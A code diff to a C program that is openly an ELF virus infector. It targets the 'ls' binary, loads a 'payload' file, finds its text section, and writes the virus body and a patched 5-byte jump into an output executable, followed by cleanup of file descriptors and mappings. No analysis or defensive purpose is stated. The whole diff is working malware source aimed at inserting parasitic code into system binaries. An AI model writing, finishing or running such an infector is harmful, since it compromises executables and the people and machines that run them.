@@ -14,10 +14,13 @@ int main(){
 
     char *path_to_elf = "ls";
     char * host;
+    int virus_fd;
     uint8_t* memory;
-    size_t virus_size;
-    Elf64_Addr jmp_off_t;
-    get_virus_payload("payload", &memory, &virus_size, &jmp_off_t);
+    size_t virus_size, virus_file_size;
+    Elf64_Addr text_off_t, jmp_off_t;
+    get_virus_payload("payload", &virus_fd, &memory, &virus_size, &text_off_t, &virus_file_size);
+    uint8_t *text_section = memory + text_off_t;
+    get_jump_offset(memory, virus_size, text_off_t, &jmp_off_t);
     unsigned char * parasite =  (unsigned  char*)"\xE9\xF2\xFC\xFF\xF1";
     size_t  jump_length = 5;
     size_t length_without_jump = virus_size;
@@ -87,7 +90,7 @@ int main(){
     *(int*)&address[0] = jmp;
 
 
-    if(write(out_fd, memory, jmp_off_t - 5) < 0){
+    if(write(out_fd, text_section, jmp_off_t - 5) < 0){
         return -1;
     }
 
@@ -97,7 +100,7 @@ int main(){
     if(write(out_fd, address, 4) < 0){
         return -1;
     }
-    if(write(out_fd, memory + jmp_off_t, virus_size - jmp_off_t) < 0){
+    if(write(out_fd, text_section + jmp_off_t, virus_size - jmp_off_t) < 0){
         return -1;
     }
 
@@ -109,6 +112,12 @@ int main(){
         return -1;
     }
     printf("%x", ehdr->e_entry);
+
+
+    munmap(mem, sb.st_size);
+    munmap(memory, virus_file_size);
     close(out_fd);
+    close(fd);
+    close(virus_fd);
     return 0;
 }
